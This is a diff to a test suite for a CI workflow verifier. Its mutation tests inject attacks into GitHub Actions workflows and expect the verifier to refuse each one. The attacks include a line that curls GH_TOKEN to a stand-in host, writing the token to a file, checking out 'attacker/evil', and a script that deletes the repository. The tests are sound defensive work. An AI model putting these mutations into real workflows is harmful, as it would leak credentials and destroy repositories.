@@ -24,6 +24,8 @@ import {
   readScriptOutputs,
   referenceFindings,
   surfaceFindings,
+  writePermissionFindings,
+  continueOnErrorFindings,
   releaseGateFindings,
   verifyWorkflows,
 } from "./verify-workflows.mjs";
@@ -47,6 +49,8 @@ const all = (w) =>
     ...releaseGateFindings(w),
     ...referenceFindings(w, SCRIPTS, settings),
     ...surfaceFindings(w),
+    ...writePermissionFindings(w),
+    ...continueOnErrorFindings(w),
   ].map((f) => `${f.file}: ${f.job}: ${f.why}`);
 /** The findings `mutate` adds to the real tree, which itself has none. */
 function added(mutate) {
@@ -219,7 +223,10 @@ describe("ENVIRONMENT_COMMANDS lists exactly what each job runs", () => {
     const used = new Map();
     for (const f of [P, C])
       for (const job of Object.values(BASE[f].jobs)) {
-        const env = typeof job.environment === "string" ? job.environment : job.environment?.name;
+        const named = typeof job.environment === "string" ? job.environment : job.environment?.name;
+        const id = Object.entries(BASE[f].jobs).find(([, x]) => x === job)[0];
+        const env =
+          named ?? (ENVIRONMENT_COMMANDS[`${f}#${id}`] !== undefined ? `${f}#${id}` : undefined);
         if (env === undefined) continue;
         if (!used.has(env)) used.set(env, new Set());
         for (const s of job.steps ?? [])
@@ -292,9 +299,9 @@ describe("16 every expression reference names something (round 5)", () => {
       "cli-release: an output the release job does not declare",
       (w) => {
         w[C].jobs.upload.steps.find((s) => s.env?.EXPECTED).env.EXPECTED =
-          "${{ needs.release.outputs.digest }}";
+          "${{ needs.build.outputs.digest }}";
       },
-      /job release has no output digest/,
+      /job build has no output digest/,
     ],
   ])("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
@@ -1424,10 +1431,12 @@ describe("17 every credentialed job's action surface is frozen (round 8)", () =>
   });
   it("refuses a recorded job the workflow no longer has", () =>
     expect(
-      surfaceFindings({ "sdk-publish.yml": { jobs: {} }, "cli-release.yml": { jobs: {} } }).map(
-        (f) => f.why,
-      ),
-    ).toContainEqual("ACTION_SURFACE records a credentialed job the workflow does not have"));
+      surfaceFindings({
+        "sdk-publish.yml": { jobs: {} },
+        "cli-release.yml": { jobs: {} },
+        "release-gate.yml": { jobs: {} },
+      }).map((f) => f.why),
+    ).toContainEqual("ACTION_SURFACE records a job the workflow does not have"));
 });
 
 describe("a step output is written by the command that redirects it (round 8, F6)", () => {
@@ -1469,6 +1478,7 @@ describe("CREDENTIAL_ENV is an explicit, complete list (round 8)", () => {
       "CARGO_REGISTRY_TOKEN",
       "CLOUDFLARE_ACCOUNT_ID",
       "DEPLOY_KEY",
+      "GH_TOKEN",
       "MAVEN_R2_ACCESS_KEY_ID",
       "MAVEN_R2_SECRET_ACCESS_KEY",
       "NUGET_API_KEY",
@@ -1496,5 +1506,285 @@ describe("CREDENTIAL_ENV is an explicit, complete list (round 8)", () => {
     expect(
       PINNED_ENV.DEPLOY_KEY("publish-npm").test("${{ secrets.NO_DEPLOY_KEY_FOR_THIS_JOB }}"),
     ).toBe(false);
+  });
+});
+
+describe("the write token, the build and every job's surface (round 9)", () => {
+  const P_ = "sdk-publish.yml";
+  const j = (w, f, id) => w[f].jobs[id];
+  const S = (w, f, id, pred) => j(w, f, id).steps.find(pred);
+  const U = (prefix) => (s) => String(s.uses).startsWith(prefix);
+  const GS = "actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b";
+  const ghStep = (w) => j(w, C, "release").steps.find((s) => s.env?.GH_TOKEN);
+  const SURFACE = /ACTION_SURFACE records/;
+  const COE = /continue-on-error/;
+  it.each([
+    [
+      "X1 release: a checkout of another repository",
+      (w) => {
+        S(w, C, "release", U("actions/checkout")).with.repository = "attacker/evil";
+      },
+      SURFACE,
+    ],
+    [
+      "X1b build: a checkout of another repository",
+      (w) => {
+        S(w, C, "build", U("actions/checkout")).with.repository = "attacker/evil";
+      },
+      SURFACE,
+    ],
+    [
+      "X2 release: a checkout of a pull request",
+      (w) => {
+        S(w, C, "release", U("actions/checkout")).with.ref = "refs/pull/1/head";
+      },
+      SURFACE,
+    ],
+    [
+      "X3 release: github-script with the contents: write token",
+      (w) => {
+        j(w, C, "release").steps.splice(2, 0, {
+          name: "x",
+          uses: GS,
+          with: {
+            script:
+              "await github.rest.git.createRef({owner:'confeature',repo:'sdks',ref:'refs/tags/sdk-go-v9.9.9',sha:context.sha})",
+          },
+        });
+      },
+      SURFACE,
+    ],
+    [
+      "X3b release: a checkout keeping the token",
+      (w) => {
+        Object.assign(S(w, C, "release", U("actions/checkout")).with, {
+          "persist-credentials": true,
+          token: "${{ github.token }}",
+        });
+      },
+      SURFACE,
+    ],
+    [
+      "X4 build: setup-deno's version from the event",
+      (w) => {
+        S(w, C, "build", U("denoland/")).with["deno-version"] =
+          "${{ github.event.head_commit.message }}";
+      },
+      SURFACE,
+    ],
+    [
+      "X5 release: a local action",
+      (w) => {
+        j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "./.github/actions/x" });
+      },
+      /runs no local or container action/,
+    ],
+    [
+      "X5b release: a container action",
+      (w) => {
+        j(w, C, "release").steps.splice(2, 0, { name: "x", uses: "docker://alpine:3" });
+      },
+      /runs no local or container action/,
+    ],
+    [
+      "X5c build: the artifact path widened",
+      (w) => {
+        S(w, C, "build", U("actions/upload-artifact")).with.path =
+          "apps/cli/dist/\n/home/runner/work/\n";
+      },
+      SURFACE,
+    ],
+    [
+      "X7 pack-npm: a checkout of another repository",
+      (w) => {
+        S(w, P_, "pack-npm", U("actions/checkout")).with.repository = "attacker/evil";
+      },
+      SURFACE,
+    ],
+    [
+      "X8 pack-npm: a checkout of a pull request",
+      (w) => {
+        S(w, P_, "pack-npm", U("actions/checkout")).with.ref = "refs/pull/1/head";
+      },
+      SURFACE,
+    ],
+    [
+      "X8b pack-npm: setup-node's version from the event",
+      (w) => {
+        S(w, P_, "pack-npm", U("actions/setup-node")).with["node-version"] =
+          "${{ github.event.head_commit.message }}";
+      },
+      SURFACE,
+    ],
+    [
+      "setup: a checkout of a pull request",
+      (w) => {
+        S(w, P_, "setup", U("actions/checkout")).with.ref = "refs/pull/1/head";
+      },
+      SURFACE,
+    ],
+    [
+      "X26 release: curl of GH_TOKEN in the gh step",
+      (w) => {
+        ghStep(w).run += '\ncurl -d "$GH_TOKEN" https://a.example\n';
+      },
+      /credential GH_TOKEN outside its recorded position|curl is not a command/,
+    ],
+    [
+      "X26b release: GH_TOKEN written to a file",
+      (w) => {
+        ghStep(w).run += '\nprintf "%s" "$GH_TOKEN" > publish-tmp/t\n';
+      },
+      /credential GH_TOKEN outside its recorded position/,
+    ],
+    [
+      "X27 release: GH_TOKEN on the digest step",
+      (w) => {
+        const s = j(w, C, "release").steps.find((x) => x.run && !x.env?.GH_TOKEN);
+        s.env = { ...(s.env ?? {}), GH_TOKEN: "${{ github.token }}" };
+      },
+      /sets the credential GH_TOKEN but its run: does not read it/,
+    ],
+    [
+      "X27b build: GH_TOKEN on the compile step makes it credentialed",
+      (w) => {
+        const s = S(w, C, "build", (x) => x.name === "Compile all targets");
+        s.env = { GH_TOKEN: "${{ github.token }}" };
+      },
+      /a credentialed job sets working-directory|deno is not a command/,
+    ],
+    [
+      "X28 nuget: a digest check with continue-on-error",
+      (w) => {
+        S(w, P_, "publish-nuget", (s) => /digest/i.test(s.name ?? ""))["continue-on-error"] = true;
+      },
+      COE,
+    ],
+    [
+      "X28b npm: every run step with continue-on-error",
+      (w) => {
+        for (const s of j(w, P_, "publish-npm").steps) if (s.run) s["continue-on-error"] = true;
+      },
+      COE,
+    ],
+    [
+      "X14 maven: the attestation with continue-on-error",
+      (w) => {
+        S(w, P_, "publish-maven", U("actions/attest"))["continue-on-error"] = true;
+      },
+      COE,
+    ],
+    [
+      "X31 build: setup-deno with an env",
+      (w) => {
+        S(w, C, "build", U("denoland/")).env = { DENO_CERT: "/tmp/x" };
+      },
+      SURFACE,
+    ],
+    [
+      "X33 workflow-rules: its steps with continue-on-error",
+      (w) => {
+        for (const s of j(w, P_, "workflow-rules").steps) if (s.run) s["continue-on-error"] = true;
+      },
+      COE,
+    ],
+    [
+      "X34 build: the on-main check with continue-on-error",
+      (w) => {
+        S(w, C, "build", (s) => /not on main/.test(s.name ?? ""))["continue-on-error"] = true;
+      },
+      COE,
+    ],
+    [
+      "X35 publish-go: its guards with continue-on-error",
+      (w) => {
+        for (const s of j(w, P_, "publish-go").steps) if (s.run) s["continue-on-error"] = true;
+      },
+      COE,
+    ],
+    [
+      "17 two recorded steps swapped",
+      (w) => {
+        const st = j(w, P_, "pack-npm").steps;
+        const a = st.findIndex(U("pnpm/"));
+        const b = st.findIndex(U("actions/setup-node"));
+        [st[a], st[b]] = [st[b], st[a]];
+      },
+      SURFACE,
+    ],
+    [
+      "17 a recorded with: key removed",
+      (w) => {
+        delete S(w, P_, "publish-pypi", U("pypa/")).with["packages-dir"];
+      },
+      SURFACE,
+    ],
+    [
+      "17 another SHA at the same position",
+      (w) => {
+        const s = S(w, P_, "publish-npm", U("actions/setup-node"));
+        s.uses = s.uses.replace(/@[0-9a-f]+$/, `@${"0".repeat(40)}`);
+      },
+      SURFACE,
+    ],
+    [
+      "17 a job ACTION_SURFACE does not record",
+      (w) => {
+        w[P_].jobs["pack-extra"] = structuredClone(w[P_].jobs["pack-npm"]);
+      },
+      /a job ACTION_SURFACE does not record/,
+    ],
+    [
+      "17 release-gate: the follow-up script changed",
+      (w) => {
+        S(w, "release-gate.yml", "test", U("actions/github-script")).with.script +=
+          "\nawait github.rest.repos.delete(context.repo);";
+      },
+      SURFACE,
+    ],
+    [
+      "18 verify.yml granted contents: write",
+      (w) => {
+        const k = Object.keys(w["verify.yml"].jobs)[0];
+        w["verify.yml"].jobs[k].permissions = { contents: "write" };
+      },
+      /WRITE_PERMISSIONS records \[\]/,
+    ],
+    [
+      "18 contract-live.yml granted write-all",
+      (w) => {
+        w["contract-live.yml"].permissions = "write-all";
+      },
+      /at the workflow level/,
+    ],
+    [
+      "18 release-gate's issues: write moved to the workflow",
+      (w) => {
+        w["release-gate.yml"].permissions = { contents: "read", issues: "write" };
+      },
+      /issues write at the workflow level/,
+    ],
+    [
+      "18 a publish job asking for contents: write too",
+      (w) => {
+        j(w, P_, "publish-npm").permissions["contents"] = "write";
+      },
+      /WRITE_PERMISSIONS records \[id-token\]/,
+    ],
+    [
+      "18 cli-windows-install-verify granted id-token",
+      (w) => {
+        const k = Object.keys(w["cli-windows-install-verify.yml"].jobs)[0];
+        w["cli-windows-install-verify.yml"].jobs[k].permissions = { "id-token": "write" };
+      },
+      /WRITE_PERMISSIONS records \[\]/,
+    ],
+  ])("refuses %s", (label, mutate, why) => {
+    const got = added(mutate);
+    expectCount(label, got);
+    expect(
+      got.some((g) => why.test(g)),
+      got.join("\n") || "no finding",
+    ).toBe(true);
   });
 });
